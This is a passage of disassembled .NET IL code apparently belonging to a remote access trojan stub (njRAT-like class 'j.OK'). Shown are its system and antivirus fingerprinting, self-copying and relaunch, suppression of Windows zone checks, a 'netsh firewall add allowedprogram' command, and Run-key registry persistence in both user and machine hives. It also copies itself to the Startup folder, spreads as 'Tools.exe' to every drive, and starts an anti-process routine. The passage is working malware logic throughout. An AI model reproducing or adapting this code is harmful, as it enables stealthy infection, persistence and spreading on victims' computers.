      IL_0310:  nop
      IL_0311:  ldc.i4.s   38
      IL_0313:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0318:  ldstr      "x86"
      IL_031d:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0322:  stloc.s    V_21
      IL_0324:  ldloc.s    V_21
      IL_0326:  brfalse.s  IL_033c

      IL_0328:  ldloc.1
      IL_0329:  ldstr      " x64"
      IL_032e:  ldsfld     string j.OK::Y
      IL_0333:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0338:  stloc.1
      IL_0339:  nop
      IL_033a:  br.s       IL_034f

      IL_033c:  nop
      IL_033d:  ldloc.1
      IL_033e:  ldstr      " x86"
      IL_0343:  ldsfld     string j.OK::Y
      IL_0348:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_034d:  stloc.1
      IL_034e:  nop
      IL_034f:  leave.s    IL_037f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0351:  dup
      IL_0352:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0357:  stloc.s    exception14
      IL_0359:  nop
      IL_035a:  ldloc.s    exception14
      IL_035c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0361:  nop
      IL_0362:  ldloc.s    exception14
      IL_0364:  stloc.s    exception7
      IL_0366:  ldloc.1
      IL_0367:  ldsfld     string j.OK::Y
      IL_036c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0371:  stloc.1
      IL_0372:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0377:  nop
      IL_0378:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_037d:  leave.s    IL_037f

    }  // end handler
    IL_037f:  nop
    IL_0380:  call       bool j.OK::Cam()
    IL_0385:  stloc.s    V_24
    IL_0387:  ldloc.s    V_24
    IL_0389:  brfalse.s  IL_039f

    IL_038b:  ldloc.1
    IL_038c:  ldstr      "Yes"
    IL_0391:  ldsfld     string j.OK::Y
    IL_0396:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_039b:  stloc.1
    IL_039c:  nop
    IL_039d:  br.s       IL_03b2

    IL_039f:  nop
    IL_03a0:  ldloc.1
    IL_03a1:  ldstr      "No"
    IL_03a6:  ldsfld     string j.OK::Y
    IL_03ab:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_03b0:  stloc.1
    IL_03b1:  nop
    IL_03b2:  ldc.i4.7
    IL_03b3:  newarr     [mscorlib]System.String
    IL_03b8:  dup
    IL_03b9:  ldc.i4.0
    IL_03ba:  ldloc.1
    IL_03bb:  stelem.ref
    IL_03bc:  dup
    IL_03bd:  ldc.i4.1
    IL_03be:  call       string j.OK::GetAntiVirus()
    IL_03c3:  stelem.ref
    IL_03c4:  dup
    IL_03c5:  ldc.i4.2
    IL_03c6:  ldsfld     string j.OK::Y
    IL_03cb:  stelem.ref
    IL_03cc:  dup
    IL_03cd:  ldc.i4.3
    IL_03ce:  call       string j.OK::GetAntiVirus()
    IL_03d3:  stelem.ref
    IL_03d4:  dup
    IL_03d5:  ldc.i4.4
    IL_03d6:  ldsfld     string j.OK::Y
    IL_03db:  stelem.ref
    IL_03dc:  dup
    IL_03dd:  ldc.i4.5
    IL_03de:  call       string j.OK::GetAntiVirus()
    IL_03e3:  stelem.ref
    IL_03e4:  dup
    IL_03e5:  ldc.i4.6
    IL_03e6:  ldsfld     string j.OK::Y
    IL_03eb:  stelem.ref
    IL_03ec:  call       string [mscorlib]System.String::Concat(string[])
    IL_03f1:  stloc.1
    IL_03f2:  ldstr      ""
    IL_03f7:  stloc.2
    .try
    {
      IL_03f8:  nop
      IL_03f9:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_03fe:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0403:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0408:  ldstr      "Software\\"
      IL_040d:  ldsfld     string j.OK::RG
      IL_0412:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0417:  ldc.i4.0
      IL_0418:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_041d:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_0422:  stloc.s    V_26
      IL_0424:  ldc.i4.0
      IL_0425:  stloc.s    V_27
      IL_0427:  br.s       IL_0458

      IL_0429:  ldloc.s    V_26
      IL_042b:  ldloc.s    V_27
      IL_042d:  ldelem.ref
      IL_042e:  stloc.s    str4
      IL_0430:  ldloc.s    str4
      IL_0432:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0437:  ldc.i4.s   32
      IL_0439:  ceq
      IL_043b:  stloc.s    V_28
      IL_043d:  ldloc.s    V_28
      IL_043f:  brfalse.s  IL_0450

      IL_0441:  ldloc.2
      IL_0442:  ldloc.s    str4
      IL_0444:  ldstr      ","
      IL_0449:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_044e:  stloc.2
      IL_044f:  nop
      IL_0450:  nop
      IL_0451:  nop
      IL_0452:  ldloc.s    V_27
      IL_0454:  ldc.i4.1
      IL_0455:  add.ovf
      IL_0456:  stloc.s    V_27
      IL_0458:  ldloc.s    V_27
      IL_045a:  ldloc.s    V_26
      IL_045c:  ldlen
      IL_045d:  conv.i4
      IL_045e:  clt
      IL_0460:  stloc.s    V_29
      IL_0462:  ldloc.s    V_29
      IL_0464:  brtrue.s   IL_0429

      IL_0466:  leave.s    IL_048a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0468:  dup
      IL_0469:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_046e:  stloc.s    exception15
      IL_0470:  nop
      IL_0471:  ldloc.s    exception15
      IL_0473:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0478:  nop
      IL_0479:  ldloc.s    exception15
      IL_047b:  stloc.s    exception8
      IL_047d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0482:  nop
      IL_0483:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0488:  leave.s    IL_048a

    }  // end handler
    IL_048a:  nop
    IL_048b:  ldloc.1
    IL_048c:  ldloc.2
    IL_048d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0492:  stloc.0
    IL_0493:  br.s       IL_0495

    IL_0495:  ldloc.0
    IL_0496:  ret
  } // end of method OK::inf

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // Code size       841 (0x349)
    .maxstack  5
    .locals init ([0] bool V_0,
             [1] class [mscorlib]System.IO.FileStream 'stream',
             [2] uint8[] 'array',
             [3] bool V_3,
             [4] class [mscorlib]System.Exception exception1,
             [5] class [mscorlib]System.Exception exception,
             [6] class [mscorlib]System.Exception exception7,
             [7] class [mscorlib]System.Exception exception2,
             [8] class [mscorlib]System.Exception exception8,
             [9] class [mscorlib]System.Exception exception3,
             [10] bool V_10,
             [11] class [mscorlib]System.Exception exception9,
             [12] class [mscorlib]System.Exception exception4,
             [13] class [mscorlib]System.Exception exception10,
             [14] class [mscorlib]System.Exception exception5,
             [15] bool V_15,
             [16] class [mscorlib]System.Exception exception11,
             [17] class [mscorlib]System.Exception exception6)
    IL_0000:  nop
    IL_0001:  ldc.i4     0x3e8
    IL_0006:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000b:  nop
    IL_000c:  ldsfld     bool j.OK::Idr
    IL_0011:  brfalse.s  IL_004a

    IL_0013:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0018:  ldsfld     string j.OK::DR
    IL_001d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0022:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0027:  ldstr      "\\"
    IL_002c:  ldsfld     string j.OK::EXE
    IL_0031:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0036:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003b:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0040:  call       bool j.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                            class [mscorlib]System.IO.FileInfo)
    IL_0045:  ldc.i4.0
    IL_0046:  ceq
    IL_0048:  br.s       IL_004b

    IL_004a:  ldc.i4.0
    IL_004b:  stloc.0
    IL_004c:  ldloc.0
    IL_004d:  brfalse    IL_0145

    .try
    {
      IL_0052:  nop
      IL_0053:  ldsfld     string j.OK::DR
      IL_0058:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_005d:  ldstr      "\\"
      IL_0062:  ldsfld     string j.OK::EXE
      IL_0067:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_006c:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0071:  stloc.3
      IL_0072:  ldloc.3
      IL_0073:  brfalse.s  IL_0095

      IL_0075:  ldsfld     string j.OK::DR
      IL_007a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_007f:  ldstr      "\\"
      IL_0084:  ldsfld     string j.OK::EXE
      IL_0089:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_008e:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0093:  nop
      IL_0094:  nop
      IL_0095:  nop
      IL_0096:  ldsfld     string j.OK::DR
      IL_009b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00a0:  ldstr      "\\"
      IL_00a5:  ldsfld     string j.OK::EXE
      IL_00aa:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00af:  ldc.i4.1
      IL_00b0:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_00b5:  stloc.1
      IL_00b6:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00bb:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00c0:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00c5:  stloc.2
      IL_00c6:  ldloc.1
      IL_00c7:  ldloc.2
      IL_00c8:  ldc.i4.0
      IL_00c9:  ldloc.2
      IL_00ca:  ldlen
      IL_00cb:  conv.i4
      IL_00cc:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00d1:  nop
      IL_00d2:  ldloc.1
      IL_00d3:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00d8:  nop
      IL_00d9:  ldloc.1
      IL_00da:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00df:  nop
      IL_00e0:  ldsfld     string j.OK::DR
      IL_00e5:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00ea:  ldstr      "\\"
      IL_00ef:  ldsfld     string j.OK::EXE
      IL_00f4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00f9:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_00fe:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0103:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0108:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_010d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0112:  pop
      IL_0113:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0118:  nop
      IL_0119:  leave.s    IL_0143

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_011b:  dup
      IL_011c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0121:  stloc.s    exception1
      IL_0123:  nop
      IL_0124:  ldloc.s    exception1
      IL_0126:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012b:  nop
      IL_012c:  ldloc.s    exception1
      IL_012e:  stloc.s    exception
      IL_0130:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0135:  nop
      IL_0136:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_013b:  nop
      IL_013c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0141:  leave.s    IL_0143

    }  // end handler
    IL_0143:  nop
    IL_0144:  nop
    IL_0145:  nop
    .try
    {
      IL_0146:  nop
      IL_0147:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_014c:  ldstr      "1"
      IL_0151:  ldc.i4.1
      IL_0152:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_0157:  nop
      IL_0158:  leave.s    IL_017c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_015a:  dup
      IL_015b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0160:  stloc.s    exception7
      IL_0162:  nop
      IL_0163:  ldloc.s    exception7
      IL_0165:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_016a:  nop
      IL_016b:  ldloc.s    exception7
      IL_016d:  stloc.s    exception2
      IL_016f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0174:  nop
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017a:  leave.s    IL_017c

    }  // end handler
    IL_017c:  nop
    .try
    {
      IL_017d:  nop
      IL_017e:  ldc.i4.5
      IL_017f:  newarr     [mscorlib]System.String
      IL_0184:  dup
      IL_0185:  ldc.i4.0
      IL_0186:  ldstr      "netsh firewall add allowedprogram \""
      IL_018b:  stelem.ref
      IL_018c:  dup
      IL_018d:  ldc.i4.1
      IL_018e:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0193:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0198:  stelem.ref
      IL_0199:  dup
      IL_019a:  ldc.i4.2
      IL_019b:  ldstr      "\" \""
      IL_01a0:  stelem.ref
      IL_01a1:  dup
      IL_01a2:  ldc.i4.3
      IL_01a3:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01a8:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_01ad:  stelem.ref
      IL_01ae:  dup
      IL_01af:  ldc.i4.4
      IL_01b0:  ldstr      "\" ENABLE"
      IL_01b5:  stelem.ref
      IL_01b6:  call       string [mscorlib]System.String::Concat(string[])
      IL_01bb:  ldc.i4.0
      IL_01bc:  ldc.i4.1
      IL_01bd:  ldc.i4     0x1388
      IL_01c2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01c7:  pop
      IL_01c8:  leave.s    IL_01ec

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ca:  dup
      IL_01cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01d0:  stloc.s    exception8
      IL_01d2:  nop
      IL_01d3:  ldloc.s    exception8
      IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01da:  nop
      IL_01db:  ldloc.s    exception8
      IL_01dd:  stloc.s    exception3
      IL_01df:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01e4:  nop
      IL_01e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01ea:  leave.s    IL_01ec

    }  // end handler
    IL_01ec:  nop
    IL_01ed:  ldsfld     bool j.OK::Isu
    IL_01f2:  stloc.s    V_10
    IL_01f4:  ldloc.s    V_10
    IL_01f6:  brfalse    IL_02c4

    .try
    {
      IL_01fb:  nop
      IL_01fc:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0201:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0206:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_020b:  ldsfld     string j.OK::sf
      IL_0210:  ldc.i4.1
      IL_0211:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0216:  ldsfld     string j.OK::RG
      IL_021b:  ldstr      "\""
      IL_0220:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0225:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_022a:  ldstr      "\" .."
      IL_022f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0234:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0239:  nop
      IL_023a:  leave.s    IL_025e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_023c:  dup
      IL_023d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0242:  stloc.s    exception9
      IL_0244:  nop
      IL_0245:  ldloc.s    exception9
      IL_0247:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_024c:  nop
      IL_024d:  ldloc.s    exception9
      IL_024f:  stloc.s    exception4
      IL_0251:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0256:  nop
      IL_0257:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_025c:  leave.s    IL_025e

    }  // end handler
    IL_025e:  nop
    .try
    {
      IL_025f:  nop
      IL_0260:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0265:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_026a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_026f:  ldsfld     string j.OK::sf
      IL_0274:  ldc.i4.1
      IL_0275:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_027a:  ldsfld     string j.OK::RG
      IL_027f:  ldstr      "\""
      IL_0284:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0289:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_028e:  ldstr      "\" .."
      IL_0293:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0298:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_029d:  nop
      IL_029e:  leave.s    IL_02c2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a0:  dup
      IL_02a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02a6:  stloc.s    exception10
      IL_02a8:  nop
      IL_02a9:  ldloc.s    exception10
      IL_02ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02b0:  nop
      IL_02b1:  ldloc.s    exception10
      IL_02b3:  stloc.s    exception5
      IL_02b5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02ba:  nop
      IL_02bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c0:  leave.s    IL_02c2

    }  // end handler
    IL_02c2:  nop
    IL_02c3:  nop
    IL_02c4:  nop
    IL_02c5:  ldsfld     bool j.OK::IsF
    IL_02ca:  stloc.s    V_15
    IL_02cc:  ldloc.s    V_15
    IL_02ce:  brfalse.s  IL_0347

    .try
    {
      IL_02d0:  nop
      IL_02d1:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_02d6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_02db:  ldc.i4.7
      IL_02dc:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02e1:  ldstr      "\\"
      IL_02e6:  ldsfld     string j.OK::RG
      IL_02eb:  ldstr      ".exe"
      IL_02f0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02f5:  ldc.i4.1
      IL_02f6:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_02fb:  nop
      IL_02fc:  ldc.i4.7
      IL_02fd:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0302:  ldstr      "\\"
      IL_0307:  ldsfld     string j.OK::RG
      IL_030c:  ldstr      ".exe"
      IL_0311:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0316:  ldc.i4.3
      IL_0317:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_031c:  stsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_0321:  leave.s    IL_0345

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0323:  dup
      IL_0324:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0329:  stloc.s    exception11
      IL_032b:  nop
      IL_032c:  ldloc.s    exception11
      IL_032e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0333:  nop
      IL_0334:  ldloc.s    exception11
      IL_0336:  stloc.s    exception6
      IL_0338:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_033d:  nop
      IL_033e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0343:  leave.s    IL_0345

    }  // end handler
    IL_0345:  nop
    IL_0346:  nop
    IL_0347:  nop
    IL_0348:  ret
  } // end of method OK::INS

  .method public static void  ko() cil managed noinlining nooptimization
  {
    // Code size       1186 (0x4a2)
    .maxstack  5
    .locals init ([0] bool createdNew,
             [1] class [mscorlib]System.Threading.Thread s,
             [2] int32 num,
             [3] string str,
             [4] bool V_4,
             [5] bool V_5,
             [6] string drivers,
             [7] string[] driver,
             [8] string[] V_8,
             [9] int32 V_9,
             [10] bool V_10,
             [11] bool V_11,
             [12] bool V_12,
             [13] class [mscorlib]System.Exception exception1,
             [14] class [mscorlib]System.Exception exception,
             [15] bool V_15,
             [16] bool V_16,
             [17] class [mscorlib]System.Threading.Thread m,
             [18] class [mscorlib]System.Exception exception8,
             [19] class [mscorlib]System.Exception exception2,
             [20] bool V_20,
             [21] class [mscorlib]System.Exception exception9,
             [22] class [mscorlib]System.Exception exception3,
             [23] bool V_23,
             [24] bool V_24,
             [25] class [mscorlib]System.Exception exception10,
             [26] class [mscorlib]System.Exception exception4,
             [27] bool V_27,
             [28] string str2,
             [29] bool V_29,
             [30] bool V_30,
             [31] bool V_31,
             [32] class [mscorlib]System.Exception exception11,
             [33] class [mscorlib]System.Exception exception5,
             [34] bool V_34,
             [35] class [mscorlib]System.Exception exception12,
             [36] class [mscorlib]System.Exception exception6,
             [37] class [mscorlib]System.Exception exception13,
             [38] class [mscorlib]System.Exception exception7,
             [39] bool V_39)
    IL_0000:  nop
    IL_0001:  ldsfld     bool j.OK::Anti_CH
    IL_0006:  stloc.s    V_4
    IL_0008:  ldloc.s    V_4
    IL_000a:  brfalse.s  IL_0013

    IL_000c:  call       void Stub.CsAntiProcess::Start()
    IL_0011:  nop
    IL_0012:  nop
    IL_0013:  nop
    IL_0014:  ldsfld     bool j.OK::USB_SP
    IL_0019:  stloc.s    V_5
    IL_001b:  ldloc.s    V_5
    IL_001d:  brfalse    IL_00ae

    IL_0022:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0027:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_002c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_0031:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0036:  stloc.s    drivers
    IL_0038:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_003d:  stloc.s    driver
    IL_003f:  ldloc.s    driver
    IL_0041:  stloc.s    V_8
    IL_0043:  ldc.i4.0
    IL_0044:  stloc.s    V_9
    IL_0046:  br.s       IL_009f

    IL_0048:  ldloc.s    V_8
    IL_004a:  ldloc.s    V_9
    IL_004c:  ldelem.ref
    IL_004d:  stloc.s    drivers
    .try
    {
      IL_004f:  nop
      IL_0050:  ldloc.s    drivers
      IL_0052:  ldstr      "Tools.exe"
      IL_0057:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_005c:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0061:  ldc.i4.0
      IL_0062:  ceq
      IL_0064:  stloc.s    V_10
      IL_0066:  ldloc.s    V_10
      IL_0068:  brfalse.s  IL_0087

      IL_006a:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
      IL_006f:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
      IL_0074:  ldloc.s    drivers
      IL_0076:  ldstr      "Tools.exe"
      IL_007b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0080:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string)
      IL_0085:  nop
      IL_0086:  nop
      IL_0087:  nop
      IL_0088:  leave.s    IL_0097

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_008a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008f:  nop
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0095:  leave.s    IL_0097

    }  // end handler
    IL_0097:  nop
    IL_0098:  nop
    IL_0099:  ldloc.s    V_9
    IL_009b:  ldc.i4.1
    IL_009c:  add.ovf
    IL_009d:  stloc.s    V_9
    IL_009f:  ldloc.s    V_9
    IL_00a1:  ldloc.s    V_8
    IL_00a3:  ldlen
    IL_00a4:  conv.i4
    IL_00a5:  clt
    IL_00a7:  stloc.s    V_11
    IL_00a9:  ldloc.s    V_11
    IL_00ab:  brtrue.s   IL_0048

    IL_00ad:  nop
    IL_00ae:  nop
    IL_00af:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_00b4:  ldnull
    IL_00b5:  cgt.un
